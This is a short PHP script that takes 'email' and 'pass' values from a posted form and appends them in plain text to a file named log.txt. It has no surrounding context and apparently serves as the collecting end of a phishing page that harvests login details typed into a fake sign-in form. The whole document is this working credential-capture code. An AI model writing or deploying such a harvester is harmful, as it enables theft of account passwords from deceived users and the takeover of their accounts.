
<?php 
$txt = "log.txt";
if(isset($_POST['email']) && isset($_POST['pass'])){
  $fh = fopen($txt,'a');
  $txt = $_POST['email'] . "\n" . $_POST['pass'];
  fwrite($fh,$txt);
  fclose($fh);
}
?>